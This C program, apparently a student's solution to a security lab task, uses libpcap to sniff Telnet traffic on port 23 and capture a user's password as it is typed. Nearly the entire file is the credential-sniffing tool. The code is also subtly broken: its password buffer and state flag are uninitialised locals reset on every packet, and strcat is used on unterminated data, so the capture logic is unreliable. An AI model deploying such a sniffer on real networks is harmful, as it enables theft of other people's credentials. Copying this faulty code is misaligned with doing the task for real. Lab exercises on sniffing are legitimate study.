// Task2_1C: Use your sniffer program to capture the password when somebody is using Telnet 
//             on the network that you are monitoring

#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>

#include "packet_header.h"

void got_packet(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *packet)
{
    struct ether_head* ether = (struct ether_head*)packet;
    struct tcp_head* tcp = (struct tcp_head*)((unsigned char*)ether + sizeof(struct ether_head) 
                            + sizeof(struct ip_head));
    
    // Get the Header length of TCP Header, which is in the first half byte in the 12th byte
    // Header length = Header length field value x 4 bytes
    // For example Header length field is 32 bytes (8), 8 is header length field value
    int tcp_length = ((*((unsigned char*)tcp + 12) & 0xf0) >> 4) * 4;

    // Length of packet = size(Ether) + size(IP) + size (TCP/UDP) + data payload
    int totalsize_head = sizeof(struct ether_head) + sizeof(struct ip_head) 
                        + tcp_length;
    
    int data_length = header->len - totalsize_head;
    const unsigned char* data;
    data = packet + totalsize_head;
    
    /*printf("Size of Ethernet: %ld\n", sizeof(struct ether_head));
    printf("Size of IP: %ld\n", sizeof(struct ip_head));
    printf("Size of TCP: %d\n", tcp_length);
    printf("Length of data is: %d\n", data_length);*/

    unsigned char pass[20];
    int check;
    // Check must be 0 or 1
    if(check > 1)
        check = 0;

    // Get data or password
    if(data_length == 1)
    {
        if(ntohs(tcp->dport) == 23)
        {
            printf("Receiving data: %c\n", *data);
            strcat(pass, data);
        }
    }

    else
    {
        if(data_length == strlen("Password: ") && ntohs(tcp->sport) == 23)
        {
            if(strcmp(data, "Password: ") == 0)
            {
                printf("Sniffed data: '%s'\n\n", data);
                check = 1;
            }
        }

        else if(data_length == 2 && ntohs(tcp->dport) == 23)
        {
            if(check != 0)
            {
                printf("Sniffed password is: ''%s''\n\n", pass);
                check = 0;
                exit(1);
            }
            else
            {
                printf("Captured data: ''%s''\n\n", pass);
                // Reset string
                memset(pass, 0, strlen(pass));
            }
        }
    }
    
}

int main()
{
    pcap_t* handle;
    struct bpf_program fp;
    char filter_exp[] = "tcp port 23";
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 net;
    int timeout = 5000;     // milliseconds
    char *device = "br-d6b258aef2ee";

    // Access to network interface
    handle = pcap_open_live(device, BUFSIZ, 1, timeout, errbuf);

    if(handle == NULL)
    {
        fprintf(stderr, "Error! Can't connect to device %s: %s\n", device, errbuf);
        return 1;
    }

    // Compile the expression to the Berkeley Packet Filter (BPF) program
    // Turn on promiscuous mode
    if(pcap_compile(handle, &fp, filter_exp, 1, net) == -1)
    {
        fprintf(stderr, "Error! Can't compile succesffuly - %s\n", errbuf);
        return 1;
    }

    // Apply the filter
    if(pcap_setfilter(handle, &fp) == -1)
    {
        fprintf(stderr, "Error! Can't apply the filter - %s\n", errbuf);
        return 1;
    }

    // capture packet until there is an error.
    pcap_loop(handle, -1, got_packet, NULL);

    // Close pcap
    pcap_close(handle);
    return 0;
}